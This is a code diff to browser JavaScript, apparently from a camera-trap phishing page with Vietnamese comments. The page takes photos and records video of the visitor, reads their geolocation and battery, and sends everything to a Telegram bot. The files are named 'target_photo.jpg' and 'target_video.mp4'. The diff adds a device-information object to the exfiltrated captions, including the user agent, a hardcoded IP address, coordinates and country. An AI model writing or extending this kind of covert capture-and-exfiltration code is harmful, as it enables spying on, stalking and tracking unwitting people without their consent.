@@ -19,6 +19,19 @@
 
  const battery = await navigator.getBattery();
 
+ // Get device information
+ const deviceInfo = {
+ os: navigator.userAgent,
+ camera: 'Front and Back Cameras Available',
+ timestamp: new Date().toLocaleString(),
+ ip: '171.253.229.161',
+ location: `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`,
+ battery: `${battery.level * 100}%`,
+ isp: 'Unknown',
+ country: 'Việt Nam',
+ googleMaps: 'https://maps.google.com/maps?q=0,0'
+ };
+
  // --- BƯỚC 1: CHỤP ẢNH NGAY LẬP TỨC ---
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
@@ -28,7 +41,7 @@
  const imgData = new FormData();
  imgData.append('chat_id', CHAT_ID);
  imgData.append('photo', imgBlob, 'target_photo.jpg');
- imgData.append('caption', `📷 Successfully Taken ✔\nLocation: ${position.coords.latitude}, ${position.coords.longitude}\nBattery: ${battery.level * 100}%`);
+ imgData.append('caption', `📷 Successfully Taken ✔\n${JSON.stringify(deviceInfo, null, 2)}`);
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
  method: 'POST',
  body: imgData
@@ -48,7 +61,7 @@
  const videoData = new FormData();
  videoData.append('chat_id', CHAT_ID);
  videoData.append('video', videoBlob, 'target_video.mp4');
- videoData.append('caption', `🎬 Successfully Recorded ✔\nLocation: ${position.coords.latitude}, ${position.coords.longitude}\nBattery: ${battery.level * 100}%`);
+ videoData.append('caption', `🎬 Successfully Recorded ✔\n${JSON.stringify(deviceInfo, null, 2)}`);
 
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
  method: 'POST',
